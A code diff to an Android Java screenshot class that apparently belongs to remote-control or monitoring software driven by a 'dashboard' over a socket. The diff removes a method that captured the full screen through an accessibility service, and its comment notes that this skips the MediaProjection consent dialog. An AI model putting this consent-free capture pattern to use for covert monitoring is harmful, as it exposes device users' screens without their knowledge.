@@ -17,7 +17,8 @@ import java.io.FileOutputStream;
 
 /**
  * Screenshot Handler - Capture screen
- * Note: Requires MediaProjection API and user permission
+ * Note: AccessibilityService-based screenshots are handled in the accessibility service process.
+ * This class handles view screenshots (app's own views) and MediaProjection screenshots.
  */
 public class ScreenshotHandler {
 
@@ -29,63 +30,19 @@ public class ScreenshotHandler {
 
     /**
      * Take one screenshot through the running accessibility service.
-     *
-     * AccessibilityService.takeScreenshot() (API 30+) does not require a
-     * MediaProjection consent dialog and captures the complete device display.
+     * NOTE: This method is deprecated for cross-process use.
+     * The 'take_screenshot' command is now handled in the accessibility service process
+     * via SocketManager.handleAccessibilityCommand().
+     * This method returns an error directing to use the dashboard command.
      */
     public JSONObject takeScreenshot() {
         JSONObject result = new JSONObject();
-
         try {
-            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
-                result.put("success", false);
-                result.put("error", "Accessibility screenshots require Android 11 or newer");
-                return result;
-            }
-
-            UnifiedAccessibilityService service = UnifiedAccessibilityService.getInstance();
-            if (service == null) {
-                result.put("success", false);
-                result.put("error", "Accessibility service is not enabled");
-                return result;
-            }
-
-            Bitmap bitmap = service.captureScreenSync();
-            if (bitmap == null) {
-                result.put("success", false);
-                result.put("error", "Accessibility screenshot capture failed");
-                return result;
-            }
-
-            // Keep the full captured resolution and use high JPEG quality for
-            // the on-demand screenshot. The live stream intentionally uses a
-            // smaller adaptive frame; this command is a single high-quality shot.
-            String base64 = bitmapToBase64(bitmap, 90);
-            int width = bitmap.getWidth();
-            int height = bitmap.getHeight();
-            bitmap.recycle();
-
-            if (base64 == null || base64.isEmpty()) {
-                result.put("success", false);
-                result.put("error", "Could not encode accessibility screenshot");
-                return result;
-            }
-
-            result.put("success", true);
-            result.put("base64", base64);
-            result.put("mimeType", "image/jpeg");
-            result.put("width", width);
-            result.put("height", height);
-            result.put("timestamp", System.currentTimeMillis());
-        } catch (Exception e) {
-            try {
-                result.put("success", false);
-                result.put("error", e.getMessage());
-            } catch (JSONException ex) {
-                ex.printStackTrace();
-            }
+            result.put("success", false);
+            result.put("error", "Accessibility screenshots must be requested via the dashboard command which routes to the accessibility service process. Use 'take_screenshot' command from dashboard.");
+        } catch (JSONException e) {
+            e.printStackTrace();
         }
-        
         return result;
     }
 
